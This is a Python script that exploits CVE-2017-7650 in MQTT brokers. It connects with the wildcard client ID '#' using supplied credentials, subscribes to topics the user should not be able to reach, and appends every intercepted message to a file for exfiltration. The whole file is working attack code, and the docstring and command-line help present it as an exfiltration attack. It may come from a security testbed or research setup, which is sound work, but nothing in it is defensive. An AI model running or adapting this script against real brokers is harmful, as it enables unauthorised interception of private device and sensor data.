import argparse
import threading
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time


def on_message(client, userdata, message):
    with userdata["lock"]:
        userdata["messages"].append(f"topic: {message.topic}  -  payload: {message.payload.decode()}\n")


def main(username, password, topics, file_name, duration=10):
    """In publisher exfiltration the attacker connects to the broker using '#' as client ID to exploit CVE-2017-7650 vulnerability and subscribe to normally inaccessible topics."""
    connection = util.Connection_status()
    data_dict = {"connection": connection, "messages": "", "lock": threading.Lock()}
    client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2, client_id="#", userdata=data_dict,
                         protocol=mqtt.MQTTv311)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_subscribe = util.on_subscribe
    reconnect_delay = 10
    start_time = time.time()

    while True:

        if util.connect_client(client, connection, reconnect_delay):
            print("Subscribing to input topics...", flush=True)
            successes = 0
            for topic in topics:
                result = client.subscribe(topic, qos=2)
                if result[0] == mqtt.MQTT_ERR_SUCCESS:
                    print(f"Subscribed to topic: {topic}", flush=True)
                    successes += 1
                else:
                    print(f"Failed to subscribe to topic: {topic}  -  Error code: {result}", flush=True)
            if successes == 0:
                print(f"Failed to subscribe to any topic, ending script...", flush=True)
                with open(file_name, "a") as f:
                    f.write("Attack Failed\n")
                return
            else:
                with open(file_name, "a") as f:
                    f.write("Beginning to receive data...\n")
            break
        else:
            if time.time() - start_time > duration:
                print("Time elapsed, execution is terminating...", flush=True)
                return
            print(f"Retrying connection in 10 seconds...", flush=True)
            time.sleep(10)

    elapsed_time = time.time() - start_time

    while elapsed_time < duration:
        time.sleep(10)
        with data_dict["lock"]:
            with open(file_name, "a") as f:
                f.write(data_dict["messages"])
            data_dict["messages"] = ""
        elapsed_time = time.time() - start_time
    else:
        client.disconnect()
        print("script ended")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='launch an exfiltration from a client exploiting an existing user with \# or + as name')
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username")
    parser.add_argument("-p", "--password", type=str, help="password")
    parser.add_argument("-n", "--file-name", type=str, help="name for the file to gather exfiltrated data")
    parser.add_argument("-t", "--topics", type=str, nargs="*", help="topics to subscribe to")
    args = parser.parse_args()
    main(args.username, args.password, args.topics, args.file_name, args.duration)
